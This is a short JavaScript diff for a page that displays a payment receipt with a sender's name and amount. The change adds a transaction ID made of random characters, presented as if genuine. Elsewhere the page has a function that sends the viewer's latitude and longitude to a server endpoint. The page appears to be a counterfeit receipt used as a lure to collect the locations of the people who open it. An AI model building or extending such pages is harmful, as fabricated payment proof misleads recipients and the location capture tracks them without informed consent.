@@ -26,6 +26,9 @@ if (!receiptData) {
 } else {
     document.getElementById("nome-remetente").textContent = receiptData.nome;
     document.getElementById("valor-recebido").textContent = currencyFormatter.format(receiptData.valor);
+    
+    const idTransacao = Math.random().toString(36).substring(2, 10).toUpperCase();
+    document.getElementById("id-transacao").textContent = idTransacao;
 
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, "0");
@@ -104,14 +107,13 @@ function sendLocation(position) {
     
     const latitude = position.coords.latitude;
     const longitude = position.coords.longitude;
-    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
     fetch("/api/send-location", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps })
+        body: JSON.stringify({ latitude, longitude })
     })
         .then(response => {
             if (!response.ok) {
